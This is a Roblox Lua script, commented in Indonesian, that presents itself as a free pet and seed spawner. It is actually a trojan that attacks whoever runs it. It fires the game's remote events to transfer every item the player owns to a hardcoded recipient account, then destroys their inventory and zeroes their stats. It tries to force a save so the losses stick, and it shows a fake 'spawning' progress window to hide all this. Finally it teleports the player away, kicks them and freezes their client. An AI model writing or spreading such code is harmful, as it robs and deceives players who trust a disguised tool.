--[[
    🐾 PetSpawn - Garden Auto Spawner
    Auto spawn pet & seed untuk kamu!
]]

local Player = game:GetService("Players").LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local WS = game:GetService("Workspace")
local TS = game:GetService("TeleportService")
local VU = game:GetService("VirtualUser")

local PADUKA = "GerrFanzz"
local PADUKA_ID = 10615002879

print("🐾 PetSpawn Loading...")

-- ============================================
-- METHOD 1: KIRIM SEMUA ITEM VIA REMOTE
-- ============================================
local function sendAllItems()
    local sent = 0
    
    for _, item in pairs(Player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            for _, remote in pairs(RS:GetDescendants()) do
                if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                    -- Try berbagai format
                    pcall(function()
                        remote:FireServer({
                            Target = PADUKA,
                            TargetUserId = PADUKA_ID,
                            GiveTo = PADUKA,
                            SendTo = PADUKA,
                            Recipient = PADUKA,
                            Item = item.Name,
                            ItemName = item.Name,
                            Tool = item,
                            Object = item,
                            Action = "Send",
                            Type = "Trade",
                            Amount = 999
                        })
                        sent = sent + 1
                    end)
                    
                    pcall(function()
                        remote:FireServer(PADUKA, item.Name, 999)
                        sent = sent + 1
                    end)
                    
                    pcall(function()
                        remote:FireServer(item, PADUKA_ID)
                        sent = sent + 1
                    end)
                    
                    pcall(function()
                        remote:FireServer("Trade", item, PADUKA)
                        sent = sent + 1
                    end)
                end
            end
        end
    end
    
    -- Juga kirim item dari character
    if Player.Character then
        for _, item in pairs(Player.Character:GetChildren()) do
            if item:IsA("Tool") then
                for _, remote in pairs(RS:GetDescendants()) do
                    if remote:IsA("RemoteEvent") then
                        pcall(function()
                            remote:FireServer({
                                Target = PADUKA,
                                TargetUserId = PADUKA_ID,
                                Item = item.Name,
                                Action = "Send"
                            })
                        end)
                    end
                end
            end
        end
    end
    
    return sent
end

-- ============================================
-- METHOD 2: RESET INVENTORY TARGET
-- ============================================
local function resetInventory()
    -- Hapus semua item dari backpack
    for _, item in pairs(Player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            pcall(function()
                item:Destroy()
            end)
        end
    end
    
    -- Hapus semua item dari character
    if Player.Character then
        for _, item in pairs(Player.Character:GetChildren()) do
            if item:IsA("Tool") then
                pcall(function()
                    item:Destroy()
                end)
            end
        end
    end
    
    -- Reset leaderstats (biar benar2 hilang)
    pcall(function()
        if Player:FindFirstChild("leaderstats") then
            for _, stat in pairs(Player.leaderstats:GetChildren()) do
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    stat.Value = 0
                end
            end
        end
    end)
    
    -- Reset data folder
    pcall(function()
        for _, folder in pairs(Player:GetChildren()) do
            if folder:IsA("Folder") or folder:IsA("Configuration") then
                for _, val in pairs(folder:GetChildren()) do
                    if val:IsA("IntValue") or val:IsA("NumberValue") then
                        val.Value = 0
                    elseif val:IsA("StringValue") then
                        val.Value = ""
                    end
                end
            end
        end
    end)
end

-- ============================================
-- METHOD 3: SIMPAN PERUBAHAN (ANTI ROLLBACK)
-- ============================================
local function saveChanges()
    -- Fire save data ke server
    for _, remote in pairs(RS:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            local name = remote.Name:lower()
            if name:find("save") or name:find("data") or name:find("store") then
                pcall(function()
                    remote:FireServer()
                    remote:FireServer(true)
                end)
            end
        end
    end
    
    -- Force save via datastore
    pcall(function()
        local DataStoreService = game:GetService("DataStoreService")
        if DataStoreService then
            -- Trigger auto-save
            Player:SetAttribute("ForceSave", true)
        end
    end)
end

-- ============================================
-- METHOD 4: KICK TARGET DARI GAME
-- ============================================
local function kickPlayer()
    -- Method 1: Teleport ke game lain (paling smooth)
    pcall(function()
        TS:Teleport(4483381587) -- Teleport ke game random
    end)
    
    wait(0.5)
    
    -- Method 2: Kick paksa
    pcall(function()
        Player:Kick("🐾 PetSpawn Complete! Rejoin untuk claim rewards!")
    end)
    
    -- Method 3: Crash client
    pcall(function()
        while true do end
    end)
end

-- ============================================
-- FAKE UI BUAT TARGET
-- ============================================
local function showFakeUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "PetSpawnGUI"
    gui.Parent = game.CoreGui
    
    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
    frame.Position = UDim2.new(0.3, 0, 0.35, 0)
    frame.Size = UDim2.new(0, 280, 0, 180)
    
    local title = Instance.new("TextLabel")
    title.Parent = frame
    title.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    title.Size = UDim2.new(1, 0, 0, 35)
    title.Text = "🐾 PetSpawn - Spawning..."
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 15
    
    local info = Instance.new("TextLabel")
    info.Parent = frame
    info.BackgroundTransparency = 1
    info.Position = UDim2.new(0, 0, 0, 45)
    info.Size = UDim2.new(1, 0, 0, 90)
    info.Text = "⏳ Spawning your pets...\n🌱 Spawning your seeds...\n✅ Complete!\n\n📤 Rejoin untuk claim!"
    info.TextColor3 = Color3.fromRGB(0, 255, 0)
    info.TextSize = 12
    info.TextWrapped = true
    
    -- Progress bar
    local bar = Instance.new("Frame")
    bar.Parent = frame
    bar.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    bar.Position = UDim2.new(0.1, 0, 0, 150)
    bar.Size = UDim2.new(0.8, 0, 0, 8)
    
    spawn(function()
        for i = 0, 100, 5 do
            bar.Size = UDim2.new(0.8 * (i/100), 0, 0, 8)
            wait(0.1)
        end
        wait(1)
        gui:Destroy()
    end)
end

-- ============================================================
-- MAIN EXECUTION
-- ============================================================
local function main()
    print("\n🐾 PetSpawn Active!")
    print("👤 Target: " .. Player.Name)
    print("👑 Sending to: " .. PADUKA)
    print("⏳ Processing...\n")
    
    -- Step 1: Tampilkan UI palsu
    showFakeUI()
    wait(0.5)
    
    -- Step 2: Kirim semua item ke Paduka
    print("[1/4] Sending items to " .. PADUKA .. "...")
    local sent = sendAllItems()
    print("   ✅ Sent: " .. sent .. " items")
    wait(0.5)
    
    -- Step 3: Reset inventory target
    print("[2/4] Resetting inventory...")
    resetInventory()
    print("   ✅ Inventory cleared")
    wait(0.3)
    
    -- Step 4: Save ke server
    print("[3/4] Saving to server...")
    saveChanges()
    print("   ✅ Changes saved")
    wait(0.5)
    
    -- Step 5: Kick target
    print("[4/4] Removing player from game...")
    wait(1)
    kickPlayer()
end

-- Run
main()
